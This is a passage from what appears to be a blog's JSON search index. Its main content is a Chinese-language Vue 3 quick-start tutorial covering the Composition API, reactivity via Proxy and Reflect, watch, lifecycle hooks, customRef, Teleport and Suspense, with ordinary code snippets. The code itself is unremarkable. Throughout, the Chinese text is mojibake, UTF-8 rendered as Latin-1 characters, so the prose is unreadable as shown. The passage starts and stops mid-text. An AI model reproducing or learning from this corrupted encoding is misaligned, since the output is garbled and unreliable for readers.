å‘ç‰ˆã€‚ ä¸»è¦æ˜¯ä¸ºäº†è§£å†³ ES5 çš„å…ˆå¤©ä¸è¶³ï¼Œæ¯”å¦‚ JavaScript é‡Œå¹¶æ²¡æœ‰ç±»çš„æ¦‚å¿µï¼Œä½†æ˜¯ç›®å‰æµè§ˆå™¨çš„ JavaScript æ˜¯ ES5 ç‰ˆæœ¬ï¼Œå¤§å¤šæ•°é«˜ç‰ˆæœ¬çš„æµè§ˆå™¨ä¹Ÿæ”¯æŒ ES6ï¼Œä¸è¿‡åªå®ç°äº† ES6 çš„éƒ¨åˆ†ç‰¹æ€§å’ŒåŠŸèƒ½ã€‚","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://serein.icu/categories/JavaScript/"}],"tags":[{"name":"js","slug":"js","permalink":"https://serein.icu/tags/js/"},{"name":"ES6","slug":"ES6","permalink":"https://serein.icu/tags/ES6/"}]},{"title":"Vue3å¿«é€Ÿä¸Šæ‰‹","slug":"04-Vue3å¿«é€Ÿä¸Šæ‰‹","date":"2022-03-14T06:00:00.000Z","updated":"2022-03-16T09:38:53.675Z","comments":true,"path":"posts/4.html","link":"","permalink":"https://serein.icu/posts/4.html","excerpt":"","text":"Vue3å¿«é€Ÿä¸Šæ‰‹ 1.Vue3ç®€ä»‹ 2020å¹´9æœˆ18æ—¥ï¼ŒVue.jså‘å¸ƒ3.0ç‰ˆæœ¬ï¼Œä»£å·ï¼šOne Pieceï¼ˆæµ·è´¼ç‹ï¼‰ è€—æ—¶2å¹´å¤šã€2600+æ¬¡æäº¤ã€30+ä¸ªRFCã€600+æ¬¡PRã€99ä½è´¡çŒ®è€… githubä¸Šçš„tagsåœ°å€ï¼šhttps://github.com/vuejs/vue-next/releases/tag/v3.0.0 2.Vue3å¸¦æ¥äº†ä»€ä¹ˆ1.æ€§èƒ½çš„æå‡ æ‰“åŒ…å¤§å°å‡å°‘41% åˆæ¬¡æ¸²æŸ“å¿«55%, æ›´æ–°æ¸²æŸ“å¿«133% å†…å­˜å‡å°‘54% â€¦â€¦ 2.æºç çš„å‡çº§ ä½¿ç”¨Proxyä»£æ›¿definePropertyå®ç°å“åº”å¼ é‡å†™è™šæ‹ŸDOMçš„å®ç°å’ŒTree-Shaking â€¦â€¦ 3.æ‹¥æŠ±TypeScript Vue3å¯ä»¥æ›´å¥½çš„æ”¯æŒTypeScript 4.æ–°çš„ç‰¹æ€§ Composition APIï¼ˆç»„åˆAPIï¼‰ setupé…ç½® refä¸reactive watchä¸watchEffect provideä¸inject â€¦â€¦ æ–°çš„å†…ç½®ç»„ä»¶ Fragment Teleport Suspense å…¶ä»–æ”¹å˜ æ–°çš„ç”Ÿå‘½å‘¨æœŸé’©å­ data é€‰é¡¹åº”å§‹ç»ˆè¢«å£°æ˜ä¸ºä¸€ä¸ªå‡½æ•° ç§»é™¤keyCodeæ”¯æŒä½œä¸º v-on çš„ä¿®é¥°ç¬¦ â€¦â€¦ åˆ›å»ºVue3.0å·¥ç¨‹1.ä½¿ç”¨ vue-cli åˆ›å»ºå®˜æ–¹æ–‡æ¡£ï¼šhttps://cli.vuejs.org/zh/guide/creating-a-project.html#vue-create ## æŸ¥çœ‹@vue/cliç‰ˆæœ¬ï¼Œç¡®ä¿@vue/cliç‰ˆæœ¬åœ¨4.5.0ä»¥ä¸Š vue --version ## å®‰è£…æˆ–è€…å‡çº§ä½ çš„@vue/cli npm install -g @vue/cli ## åˆ›å»º vue create vue_test ## å¯åŠ¨ cd vue_test npm run serve 2.ä½¿ç”¨ vite åˆ›å»ºå®˜æ–¹æ–‡æ¡£ï¼šhttps://v3.cn.vuejs.org/guide/installation.html#vite viteå®˜ç½‘ï¼šhttps://vitejs.cn ä»€ä¹ˆæ˜¯viteï¼Ÿâ€”â€” æ–°ä¸€ä»£å‰ç«¯æ„å»ºå·¥å…·ã€‚ ä¼˜åŠ¿å¦‚ä¸‹ï¼š å¼€å‘ç¯å¢ƒä¸­ï¼Œæ— éœ€æ‰“åŒ…æ“ä½œï¼Œå¯å¿«é€Ÿçš„å†·å¯åŠ¨ã€‚ è½»é‡å¿«é€Ÿçš„çƒ­é‡è½½ï¼ˆHMRï¼‰ã€‚ çœŸæ­£çš„æŒ‰éœ€ç¼–è¯‘ï¼Œä¸å†ç­‰å¾…æ•´ä¸ªåº”ç”¨ç¼–è¯‘å®Œæˆã€‚ ä¼ ç»Ÿæ„å»º ä¸ viteæ„å»ºå¯¹æ¯”å›¾ ## åˆ›å»ºå·¥ç¨‹ npm init vite-app &lt;project-name&gt; ## è¿›å…¥å·¥ç¨‹ç›®å½• cd &lt;project-name&gt; ## å®‰è£…ä¾èµ– npm install ## è¿è¡Œ npm run dev å¸¸ç”¨ Composition APIå®˜æ–¹æ–‡æ¡£: https://v3.cn.vuejs.org/guide/composition-api-introduction.html 1.æ‹‰å¼€åºå¹•çš„setup ç†è§£ï¼šVue3.0ä¸­ä¸€ä¸ªæ–°çš„é…ç½®é¡¹ï¼Œå€¼ä¸ºä¸€ä¸ªå‡½æ•°ã€‚ setupæ˜¯æ‰€æœ‰Composition APIï¼ˆç»„åˆAPIï¼‰â€œ è¡¨æ¼”çš„èˆå° â€ã€‚ ç»„ä»¶ä¸­æ‰€ç”¨åˆ°çš„ï¼šæ•°æ®ã€æ–¹æ³•ç­‰ç­‰ï¼Œå‡è¦é…ç½®åœ¨setupä¸­ã€‚ setupå‡½æ•°çš„ä¸¤ç§è¿”å›å€¼ï¼š è‹¥è¿”å›ä¸€ä¸ªå¯¹è±¡ï¼Œåˆ™å¯¹è±¡ä¸­çš„å±æ€§ã€æ–¹æ³•, åœ¨æ¨¡æ¿ä¸­å‡å¯ä»¥ç›´æ¥ä½¿ç”¨ã€‚ï¼ˆé‡ç‚¹å…³æ³¨ï¼ï¼‰ è‹¥è¿”å›ä¸€ä¸ªæ¸²æŸ“å‡½æ•°ï¼šåˆ™å¯ä»¥è‡ªå®šä¹‰æ¸²æŸ“å†…å®¹ã€‚ï¼ˆäº†è§£ï¼‰ æ³¨æ„ç‚¹ï¼š å°½é‡ä¸è¦ä¸Vue2.xé…ç½®æ··ç”¨ Vue2.xé…ç½®ï¼ˆdataã€methosã€computedâ€¦ï¼‰ä¸­å¯ä»¥è®¿é—®åˆ°setupä¸­çš„å±æ€§ã€æ–¹æ³•ã€‚ ä½†åœ¨setupä¸­ä¸èƒ½è®¿é—®åˆ°Vue2.xé…ç½®ï¼ˆdataã€methosã€computedâ€¦ï¼‰ã€‚ å¦‚æœæœ‰é‡å, setupä¼˜å…ˆã€‚ setupä¸èƒ½æ˜¯ä¸€ä¸ªasyncå‡½æ•°ï¼Œå› ä¸ºè¿”å›å€¼ä¸å†æ˜¯returnçš„å¯¹è±¡, è€Œæ˜¯promise, æ¨¡æ¿çœ‹ä¸åˆ°returnå¯¹è±¡ä¸­çš„å±æ€§ã€‚ï¼ˆåæœŸä¹Ÿå¯ä»¥è¿”å›ä¸€ä¸ªPromiseå®ä¾‹ï¼Œä½†éœ€è¦Suspenseå’Œå¼‚æ­¥ç»„ä»¶çš„é…åˆï¼‰ 2.refå‡½æ•° ä½œç”¨: å®šä¹‰ä¸€ä¸ªå“åº”å¼çš„æ•°æ® è¯­æ³•: const xxx = ref(initValue) åˆ›å»ºä¸€ä¸ªåŒ…å«å“åº”å¼æ•°æ®çš„å¼•ç”¨å¯¹è±¡ï¼ˆreferenceå¯¹è±¡ï¼Œç®€ç§°refå¯¹è±¡ï¼‰ã€‚ JSä¸­æ“ä½œæ•°æ®ï¼š xxx.value æ¨¡æ¿ä¸­è¯»å–æ•°æ®: ä¸éœ€è¦.valueï¼Œç›´æ¥ï¼š&lt;div&gt;{{xxx}}&lt;/div&gt; å¤‡æ³¨ï¼š æ¥æ”¶çš„æ•°æ®å¯ä»¥æ˜¯ï¼šåŸºæœ¬ç±»å‹ã€ä¹Ÿå¯ä»¥æ˜¯å¯¹è±¡ç±»å‹ã€‚ åŸºæœ¬ç±»å‹çš„æ•°æ®ï¼šå“åº”å¼ä¾ç„¶æ˜¯é Object.defineProperty()çš„getä¸setå®Œæˆçš„ã€‚ å¯¹è±¡ç±»å‹çš„æ•°æ®ï¼šå†…éƒ¨ â€œ æ±‚åŠ© â€ äº†Vue3.0ä¸­çš„ä¸€ä¸ªæ–°å‡½æ•°â€”â€” reactiveå‡½æ•°ã€‚ 3.reactiveå‡½æ•° ä½œç”¨: å®šä¹‰ä¸€ä¸ªå¯¹è±¡ç±»å‹çš„å“åº”å¼æ•°æ®ï¼ˆåŸºæœ¬ç±»å‹ä¸è¦ç”¨å®ƒï¼Œè¦ç”¨refå‡½æ•°ï¼‰ è¯­æ³•ï¼šconst ä»£ç†å¯¹è±¡= reactive(æºå¯¹è±¡)æ¥æ”¶ä¸€ä¸ªå¯¹è±¡ï¼ˆæˆ–æ•°ç»„ï¼‰ï¼Œè¿”å›ä¸€ä¸ªä»£ç†å¯¹è±¡ï¼ˆProxyçš„å®ä¾‹å¯¹è±¡ï¼Œç®€ç§°proxyå¯¹è±¡ï¼‰ reactiveå®šä¹‰çš„å“åº”å¼æ•°æ®æ˜¯â€œæ·±å±‚æ¬¡çš„â€ã€‚ å†…éƒ¨åŸºäº ES6 çš„ Proxy å®ç°ï¼Œé€šè¿‡ä»£ç†å¯¹è±¡æ“ä½œæºå¯¹è±¡å†…éƒ¨æ•°æ®è¿›è¡Œæ“ä½œã€‚ 4.Vue3.0ä¸­çš„å“åº”å¼åŸç†vue2.xçš„å“åº”å¼ å®ç°åŸç†ï¼š å¯¹è±¡ç±»å‹ï¼šé€šè¿‡Object.defineProperty()å¯¹å±æ€§çš„è¯»å–ã€ä¿®æ”¹è¿›è¡Œæ‹¦æˆªï¼ˆæ•°æ®åŠ«æŒï¼‰ã€‚ æ•°ç»„ç±»å‹ï¼šé€šè¿‡é‡å†™æ›´æ–°æ•°ç»„çš„ä¸€ç³»åˆ—æ–¹æ³•æ¥å®ç°æ‹¦æˆªã€‚ï¼ˆå¯¹æ•°ç»„çš„å˜æ›´æ–¹æ³•è¿›è¡Œäº†åŒ…è£¹ï¼‰ã€‚ Object.defineProperty(data, 'count', { get () {}, set () {} }) å­˜åœ¨é—®é¢˜ï¼š æ–°å¢å±æ€§ã€åˆ é™¤å±æ€§, ç•Œé¢ä¸ä¼šæ›´æ–°ã€‚ ç›´æ¥é€šè¿‡ä¸‹æ ‡ä¿®æ”¹æ•°ç»„, ç•Œé¢ä¸ä¼šè‡ªåŠ¨æ›´æ–°ã€‚ Vue3.0çš„å“åº”å¼ å®ç°åŸç†: é€šè¿‡Proxyï¼ˆä»£ç†ï¼‰: æ‹¦æˆªå¯¹è±¡ä¸­ä»»æ„å±æ€§çš„å˜åŒ–, åŒ…æ‹¬ï¼šå±æ€§å€¼çš„è¯»å†™ã€å±æ€§çš„æ·»åŠ ã€å±æ€§çš„åˆ é™¤ç­‰ã€‚ é€šè¿‡Reflectï¼ˆåå°„ï¼‰: å¯¹æºå¯¹è±¡çš„å±æ€§è¿›è¡Œæ“ä½œã€‚ MDNæ–‡æ¡£ä¸­æè¿°çš„Proxyä¸Reflectï¼š Proxyï¼šhttps://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Proxy Reflectï¼šhttps://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Reflect new Proxy(data, { // æ‹¦æˆªè¯»å–å±æ€§å€¼ get (target, prop) { return Reflect.get(target, prop) }, // æ‹¦æˆªè®¾ç½®å±æ€§å€¼æˆ–æ·»åŠ æ–°å±æ€§ set (target, prop, value) { return Reflect.set(target, prop, value) }, // æ‹¦æˆªåˆ é™¤å±æ€§ deleteProperty (target, prop) { return Reflect.deleteProperty(target, prop) } }) proxy.name = 'tom' 5.reactiveå¯¹æ¯”ref ä»å®šä¹‰æ•°æ®è§’åº¦å¯¹æ¯”ï¼š refç”¨æ¥å®šä¹‰ï¼šåŸºæœ¬ç±»å‹æ•°æ®ã€‚ reactiveç”¨æ¥å®šä¹‰ï¼šå¯¹è±¡ï¼ˆæˆ–æ•°ç»„ï¼‰ç±»å‹æ•°æ®ã€‚ å¤‡æ³¨ï¼šrefä¹Ÿå¯ä»¥ç”¨æ¥å®šä¹‰å¯¹è±¡ï¼ˆæˆ–æ•°ç»„ï¼‰ç±»å‹æ•°æ®, å®ƒå†…éƒ¨ä¼šè‡ªåŠ¨é€šè¿‡reactiveè½¬ä¸ºä»£ç†å¯¹è±¡ã€‚ ä»åŸç†è§’åº¦å¯¹æ¯”ï¼š refé€šè¿‡Object.defineProperty()çš„getä¸setæ¥å®ç°å“åº”å¼ï¼ˆæ•°æ®åŠ«æŒï¼‰ã€‚ reactiveé€šè¿‡ä½¿ç”¨Proxyæ¥å®ç°å“åº”å¼ï¼ˆæ•°æ®åŠ«æŒï¼‰, å¹¶é€šè¿‡Reflectæ“ä½œæºå¯¹è±¡å†…éƒ¨çš„æ•°æ®ã€‚ ä»ä½¿ç”¨è§’åº¦å¯¹æ¯”ï¼š refå®šä¹‰çš„æ•°æ®ï¼šæ“ä½œæ•°æ®éœ€è¦.valueï¼Œè¯»å–æ•°æ®æ—¶æ¨¡æ¿ä¸­ç›´æ¥è¯»å–ä¸éœ€è¦.valueã€‚ reactiveå®šä¹‰çš„æ•°æ®ï¼šæ“ä½œæ•°æ®ä¸è¯»å–æ•°æ®ï¼šå‡ä¸éœ€è¦.valueã€‚ 6.setupçš„ä¸¤ä¸ªæ³¨æ„ç‚¹ setupæ‰§è¡Œçš„æ—¶æœº åœ¨beforeCreateä¹‹å‰æ‰§è¡Œä¸€æ¬¡ï¼Œthisæ˜¯undefinedã€‚ setupçš„å‚æ•° propsï¼šå€¼ä¸ºå¯¹è±¡ï¼ŒåŒ…å«ï¼šç»„ä»¶å¤–éƒ¨ä¼ é€’è¿‡æ¥ï¼Œä¸”ç»„ä»¶å†…éƒ¨å£°æ˜æ¥æ”¶äº†çš„å±æ€§ã€‚ contextï¼šä¸Šä¸‹æ–‡å¯¹è±¡ attrs: å€¼ä¸ºå¯¹è±¡ï¼ŒåŒ…å«ï¼šç»„ä»¶å¤–éƒ¨ä¼ é€’è¿‡æ¥ï¼Œä½†æ²¡æœ‰åœ¨propsé…ç½®ä¸­å£°æ˜çš„å±æ€§, ç›¸å½“äº this.$attrsã€‚ slots: æ”¶åˆ°çš„æ’æ§½å†…å®¹, ç›¸å½“äº this.$slotsã€‚ emit: åˆ†å‘è‡ªå®šä¹‰äº‹ä»¶çš„å‡½æ•°, ç›¸å½“äº this.$emitã€‚ 7.è®¡ç®—å±æ€§ä¸ç›‘è§†1.computedå‡½æ•° ä¸Vue2.xä¸­computedé…ç½®åŠŸèƒ½ä¸€è‡´ å†™æ³• import {computed} from 'vue' setup(){ ... //è®¡ç®—å±æ€§â€”â€”ç®€å†™ let fullName = computed(()=&gt;{ return person.firstName + '-' + person.lastName }) //è®¡ç®—å±æ€§â€”â€”å®Œæ•´ let fullName = computed({ get(){ return person.firstName + '-' + person.lastName }, set(value){ const nameArr = value.split('-') person.firstName = nameArr[0] person.lastName = nameArr[1] } }) } 2.watchå‡½æ•° ä¸Vue2.xä¸­watché…ç½®åŠŸèƒ½ä¸€è‡´ ä¸¤ä¸ªå°â€œå‘â€ï¼š ç›‘è§†reactiveå®šä¹‰çš„å“åº”å¼æ•°æ®æ—¶ï¼šoldValueæ— æ³•æ­£ç¡®è·å–ã€å¼ºåˆ¶å¼€å¯äº†æ·±åº¦ç›‘è§†ï¼ˆdeepé…ç½®å¤±æ•ˆï¼‰ã€‚ ç›‘è§†reactiveå®šä¹‰çš„å“åº”å¼æ•°æ®ä¸­æŸä¸ªå±æ€§æ—¶ï¼šdeepé…ç½®æœ‰æ•ˆã€‚ //æƒ…å†µä¸€ï¼šç›‘è§†refå®šä¹‰çš„å“åº”å¼æ•°æ® watch(sum,(newValue,oldValue)=&gt;{ console.log('sumå˜åŒ–äº†',newValue,oldValue) },{immediate:true}) //æƒ…å†µäºŒï¼šç›‘è§†å¤šä¸ªrefå®šä¹‰çš„å“åº”å¼æ•°æ® watch([sum,msg],(newValue,oldValue)=&gt;{ console.log('sumæˆ–msgå˜åŒ–äº†',newValue,oldValue) }) /* æƒ…å†µä¸‰ï¼šç›‘è§†reactiveå®šä¹‰çš„å“åº”å¼æ•°æ® è‹¥watchç›‘è§†çš„æ˜¯reactiveå®šä¹‰çš„å“åº”å¼æ•°æ®ï¼Œåˆ™æ— æ³•æ­£ç¡®è·å¾—oldValueï¼ï¼ è‹¥watchç›‘è§†çš„æ˜¯reactiveå®šä¹‰çš„å“åº”å¼æ•°æ®ï¼Œåˆ™å¼ºåˆ¶å¼€å¯äº†æ·±åº¦ç›‘è§† */ watch(person,(newValue,oldValue)=&gt;{ console.log('personå˜åŒ–äº†',newValue,oldValue) },{immediate:true,deep:false}) //æ­¤å¤„çš„deepé…ç½®ä¸å†å¥æ•ˆ //æƒ…å†µå››ï¼šç›‘è§†reactiveå®šä¹‰çš„å“åº”å¼æ•°æ®ä¸­çš„æŸä¸ªå±æ€§ watch(()=&gt;person.job,(newValue,oldValue)=&gt;{ console.log('personçš„jobå˜åŒ–äº†',newValue,oldValue) },{immediate:true,deep:true}) //æƒ…å†µäº”ï¼šç›‘è§†reactiveå®šä¹‰çš„å“åº”å¼æ•°æ®ä¸­çš„æŸäº›å±æ€§ watch([()=&gt;person.job,()=&gt;person.name],(newValue,oldValue)=&gt;{ console.log('personçš„jobå˜åŒ–äº†',newValue,oldValue) },{immediate:true,deep:true}) //ç‰¹æ®Šæƒ…å†µ watch(()=&gt;person.job,(newValue,oldValue)=&gt;{ console.log('personçš„jobå˜åŒ–äº†',newValue,oldValue) },{deep:true}) //æ­¤å¤„ç”±äºç›‘è§†çš„æ˜¯reactiveç´ å®šä¹‰çš„å¯¹è±¡ä¸­çš„æŸä¸ªå±æ€§ï¼Œæ‰€ä»¥deepé…ç½®æœ‰æ•ˆ 3.watchEffectå‡½æ•° watchçš„å¥—è·¯æ˜¯ï¼šæ—¢è¦æŒ‡æ˜ç›‘è§†çš„å±æ€§ï¼Œä¹Ÿè¦æŒ‡æ˜ç›‘è§†çš„å›è°ƒã€‚ watchEffectçš„å¥—è·¯æ˜¯ï¼šä¸ç”¨æŒ‡æ˜ç›‘è§†å“ªä¸ªå±æ€§ï¼Œç›‘è§†çš„å›è°ƒä¸­ç”¨åˆ°å“ªä¸ªå±æ€§ï¼Œé‚£å°±ç›‘è§†å“ªä¸ªå±æ€§ã€‚ watchEffectæœ‰ç‚¹åƒcomputedï¼š ä½†computedæ³¨é‡çš„è®¡ç®—å‡ºæ¥çš„å€¼ï¼ˆå›è°ƒå‡½æ•°çš„è¿”å›å€¼ï¼‰ï¼Œæ‰€ä»¥å¿…é¡»è¦å†™è¿”å›å€¼ã€‚ è€ŒwatchEffectæ›´æ³¨é‡çš„æ˜¯è¿‡ç¨‹ï¼ˆå›è°ƒå‡½æ•°çš„å‡½æ•°ä½“ï¼‰ï¼Œæ‰€ä»¥ä¸ç”¨å†™è¿”å›å€¼ã€‚ //watchEffectæ‰€æŒ‡å®šçš„å›è°ƒä¸­ç”¨åˆ°çš„æ•°æ®åªè¦å‘ç”Ÿå˜åŒ–ï¼Œåˆ™ç›´æ¥é‡æ–°æ‰§è¡Œå›è°ƒã€‚ watchEffect(()=&gt;{ const x1 = sum.value const x2 = person.age console.log('watchEffecté…ç½®çš„å›è°ƒæ‰§è¡Œäº†') }) 8.ç”Ÿå‘½å‘¨æœŸ Vue3.0ä¸­å¯ä»¥ç»§ç»­ä½¿ç”¨Vue2.xä¸­çš„ç”Ÿå‘½å‘¨æœŸé’©å­ï¼Œä½†æœ‰æœ‰ä¸¤ä¸ªè¢«æ›´åï¼š beforeDestroyæ”¹åä¸º beforeUnmount destroyedæ”¹åä¸º unmounted Vue3.0ä¹Ÿæä¾›äº† Composition API å½¢å¼çš„ç”Ÿå‘½å‘¨æœŸé’©å­ï¼Œä¸Vue2.xä¸­é’©å­å¯¹åº”å…³ç³»å¦‚ä¸‹ï¼š beforeCreate===&gt;setup() created=======&gt;setup() beforeMount ===&gt;onBeforeMount mounted=======&gt;onMounted beforeUpdate===&gt;onBeforeUpdate updated =======&gt;onUpdated beforeUnmount&nbsp;==&gt;onBeforeUnmount unmounted =====&gt;onUnmounted 9.è‡ªå®šä¹‰hookå‡½æ•° ä»€ä¹ˆæ˜¯hookï¼Ÿâ€”â€” æœ¬è´¨æ˜¯ä¸€ä¸ªå‡½æ•°ï¼ŒæŠŠsetupå‡½æ•°ä¸­ä½¿ç”¨çš„Composition APIè¿›è¡Œäº†å°è£…ã€‚ ç±»ä¼¼äºvue2.xä¸­çš„mixinã€‚ è‡ªå®šä¹‰hookçš„ä¼˜åŠ¿: å¤ç”¨ä»£ç , è®©setupä¸­çš„é€»è¾‘æ›´æ¸…æ¥šæ˜“æ‡‚ã€‚ 10.toRef ä½œç”¨ï¼šåˆ›å»ºä¸€ä¸ª ref å¯¹è±¡ï¼Œå…¶valueå€¼æŒ‡å‘å¦ä¸€ä¸ªå¯¹è±¡ä¸­çš„æŸä¸ªå±æ€§ã€‚ è¯­æ³•ï¼šconst name = toRef(person,'name') åº”ç”¨: è¦å°†å“åº”å¼å¯¹è±¡ä¸­çš„æŸä¸ªå±æ€§å•ç‹¬æä¾›ç»™å¤–éƒ¨ä½¿ç”¨æ—¶ã€‚ æ‰©å±•ï¼štoRefs ä¸toRefåŠŸèƒ½ä¸€è‡´ï¼Œä½†å¯ä»¥æ‰¹é‡åˆ›å»ºå¤šä¸ª ref å¯¹è±¡ï¼Œè¯­æ³•ï¼štoRefs(person) å…¶å®ƒ Composition API1.shallowReactive ä¸ shallowRef shallowReactiveï¼šåªå¤„ç†å¯¹è±¡æœ€å¤–å±‚å±æ€§çš„å“åº”å¼ï¼ˆæµ…å“åº”å¼ï¼‰ã€‚ shallowRefï¼šåªå¤„ç†åŸºæœ¬æ•°æ®ç±»å‹çš„å“åº”å¼, ä¸è¿›è¡Œå¯¹è±¡çš„å“åº”å¼å¤„ç†ã€‚ ä»€ä¹ˆæ—¶å€™ä½¿ç”¨? å¦‚æœæœ‰ä¸€ä¸ªå¯¹è±¡æ•°æ®ï¼Œç»“æ„æ¯”è¾ƒæ·±, ä½†å˜åŒ–æ—¶åªæ˜¯å¤–å±‚å±æ€§å˜åŒ– ===&gt; shallowReactiveã€‚ å¦‚æœæœ‰ä¸€ä¸ªå¯¹è±¡æ•°æ®ï¼Œåç»­åŠŸèƒ½ä¸ä¼šä¿®æ”¹è¯¥å¯¹è±¡ä¸­çš„å±æ€§ï¼Œè€Œæ˜¯ç”Ÿæ–°çš„å¯¹è±¡æ¥æ›¿æ¢ ===&gt; shallowRefã€‚ 2.readonly ä¸ shallowReadonly readonly: è®©ä¸€ä¸ªå“åº”å¼æ•°æ®å˜ä¸ºåªè¯»çš„ï¼ˆæ·±åªè¯»ï¼‰ã€‚ shallowReadonlyï¼šè®©ä¸€ä¸ªå“åº”å¼æ•°æ®å˜ä¸ºåªè¯»çš„ï¼ˆæµ…åªè¯»ï¼‰ã€‚ åº”ç”¨åœºæ™¯: ä¸å¸Œæœ›æ•°æ®è¢«ä¿®æ”¹æ—¶ã€‚ 3.toRaw ä¸ markRaw toRawï¼š ä½œç”¨ï¼šå°†ä¸€ä¸ªç”±reactiveç”Ÿæˆçš„å“åº”å¼å¯¹è±¡è½¬ä¸ºæ™®é€šå¯¹è±¡ã€‚ ä½¿ç”¨åœºæ™¯ï¼šç”¨äºè¯»å–å“åº”å¼å¯¹è±¡å¯¹åº”çš„æ™®é€šå¯¹è±¡ï¼Œå¯¹è¿™ä¸ªæ™®é€šå¯¹è±¡çš„æ‰€æœ‰æ“ä½œï¼Œä¸ä¼šå¼•èµ·é¡µé¢æ›´æ–°ã€‚ markRawï¼š ä½œç”¨ï¼šæ ‡è®°ä¸€ä¸ªå¯¹è±¡ï¼Œä½¿å…¶æ°¸è¿œä¸ä¼šå†æˆä¸ºå“åº”å¼å¯¹è±¡ã€‚ åº”ç”¨åœºæ™¯: æœ‰äº›å€¼ä¸åº”è¢«è®¾ç½®ä¸ºå“åº”å¼çš„ï¼Œä¾‹å¦‚å¤æ‚çš„ç¬¬ä¸‰æ–¹ç±»åº“ç­‰ã€‚ å½“æ¸²æŸ“å…·æœ‰ä¸å¯å˜æ•°æ®æºçš„å¤§åˆ—è¡¨æ—¶ï¼Œè·³è¿‡å“åº”å¼è½¬æ¢å¯ä»¥æé«˜æ€§èƒ½ã€‚ 4.customRef ä½œç”¨ï¼šåˆ›å»ºä¸€ä¸ªè‡ªå®šä¹‰çš„ refï¼Œå¹¶å¯¹å…¶ä¾èµ–é¡¹è·Ÿè¸ªå’Œæ›´æ–°è§¦å‘è¿›è¡Œæ˜¾å¼æ§åˆ¶ã€‚ å®ç°é˜²æŠ–æ•ˆæœï¼š &lt;template&gt; &lt;input type=\"text\" v-model=\"keyword\"&gt; &lt;h3&gt;{{keyword}}&lt;/h3&gt; &lt;/template&gt; &lt;script&gt; import {ref,customRef} from 'vue' export default { name:'Demo', setup(){ // let keyword = ref('hello') //ä½¿ç”¨Vueå‡†å¤‡å¥½çš„å†…ç½®ref //è‡ªå®šä¹‰ä¸€ä¸ªmyRef function myRef(value,delay){ let timer //é€šè¿‡customRefå»å®ç°è‡ªå®šä¹‰ return customRef((track,trigger)=&gt;{ return{ get(){ track() //å‘Šè¯‰Vueè¿™ä¸ªvalueå€¼æ˜¯éœ€è¦è¢«â€œè¿½è¸ªâ€çš„ return value }, set(newValue){ clearTimeout(timer) timer = setTimeout(()=&gt;{ value = newValue trigger() //å‘Šè¯‰Vueå»æ›´æ–°ç•Œé¢ },delay) } } }) } let keyword = myRef('hello',500) //ä½¿ç”¨ç¨‹åºå‘˜è‡ªå®šä¹‰çš„ref return { keyword } } } &lt;/script&gt; 5.provide ä¸ inject ä½œç”¨ï¼šå®ç°ç¥–ä¸åä»£ç»„ä»¶é—´é€šä¿¡ å¥—è·¯ï¼šçˆ¶ç»„ä»¶æœ‰ä¸€ä¸ª provide é€‰é¡¹æ¥æä¾›æ•°æ®ï¼Œåä»£ç»„ä»¶æœ‰ä¸€ä¸ª inject é€‰é¡¹æ¥å¼€å§‹ä½¿ç”¨è¿™äº›æ•°æ® å…·ä½“å†™æ³•ï¼š ç¥–ç»„ä»¶ä¸­ï¼š setup(){ ...... let car = reactive({name:'å¥”é©°',price:'40ä¸‡'}) provide('car',car) ...... } åä»£ç»„ä»¶ä¸­ï¼š setup(props,context){ ...... const car = inject('car') return {car} ...... } 6.å“åº”å¼æ•°æ®çš„åˆ¤æ–­ isRef: æ£€æŸ¥ä¸€ä¸ªå€¼æ˜¯å¦ä¸ºä¸€ä¸ª ref å¯¹è±¡ isReactive: æ£€æŸ¥ä¸€ä¸ªå¯¹è±¡æ˜¯å¦æ˜¯ç”± reactive åˆ›å»ºçš„å“åº”å¼ä»£ç† isReadonly: æ£€æŸ¥ä¸€ä¸ªå¯¹è±¡æ˜¯å¦æ˜¯ç”± readonly åˆ›å»ºçš„åªè¯»ä»£ç† isProxy: æ£€æŸ¥ä¸€ä¸ªå¯¹è±¡æ˜¯å¦æ˜¯ç”± reactive æˆ–è€… readonly æ–¹æ³•åˆ›å»ºçš„ä»£ç† Composition API çš„ä¼˜åŠ¿1.Options API å­˜åœ¨çš„é—®é¢˜ä½¿ç”¨ä¼ ç»ŸOptionsAPIä¸­ï¼Œæ–°å¢æˆ–è€…ä¿®æ”¹ä¸€ä¸ªéœ€æ±‚ï¼Œå°±éœ€è¦åˆ†åˆ«åœ¨dataï¼Œmethodsï¼Œcomputedé‡Œä¿®æ”¹ ã€‚ 2.Composition API çš„ä¼˜åŠ¿æˆ‘ä»¬å¯ä»¥æ›´åŠ ä¼˜é›…çš„ç»„ç»‡æˆ‘ä»¬çš„ä»£ç ï¼Œå‡½æ•°ã€‚è®©ç›¸å…³åŠŸèƒ½çš„ä»£ç æ›´åŠ æœ‰åºçš„ç»„ç»‡åœ¨ä¸€èµ·ã€‚ æ–°çš„ç»„ä»¶1.Fragment åœ¨Vue2ä¸­: ç»„ä»¶å¿…é¡»æœ‰ä¸€ä¸ªæ ¹æ ‡ç­¾ åœ¨Vue3ä¸­: ç»„ä»¶å¯ä»¥æ²¡æœ‰æ ¹æ ‡ç­¾, å†…éƒ¨ä¼šå°†å¤šä¸ªæ ‡ç­¾åŒ…å«åœ¨ä¸€ä¸ªFragmentè™šæ‹Ÿå…ƒç´ ä¸­ å¥½å¤„: å‡å°‘æ ‡ç­¾å±‚çº§, å‡å°å†…å­˜å ç”¨ 2.Teleport ä»€ä¹ˆæ˜¯Teleportï¼Ÿâ€”â€” Teleport æ˜¯ä¸€ç§èƒ½å¤Ÿå°†æˆ‘ä»¬çš„ç»„ä»¶htmlç»“æ„ç§»åŠ¨åˆ°æŒ‡å®šä½ç½®çš„æŠ€æœ¯ã€‚ &lt;teleport to=\"ç§»åŠ¨ä½ç½®\"&gt; &lt;div v-if=\"isShow\" class=\"mask\"&gt; &lt;div class=\"dialog\"&gt; &lt;h3&gt;æˆ‘æ˜¯ä¸€ä¸ªå¼¹çª—&lt;/h3&gt; &lt;button @click=\"isShow = false\"&gt;å…³é—­å¼¹çª—&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; &lt;/teleport&gt; 3.Suspense ç­‰å¾…å¼‚æ­¥ç»„ä»¶æ—¶æ¸²æŸ“ä¸€äº›é¢å¤–å†…å®¹ï¼Œè®©åº”ç”¨æœ‰æ›´å¥½çš„ç”¨æˆ·ä½“éªŒ ä½¿ç”¨æ­¥éª¤ï¼š å¼‚æ­¥å¼•å…¥ç»„ä»¶ import 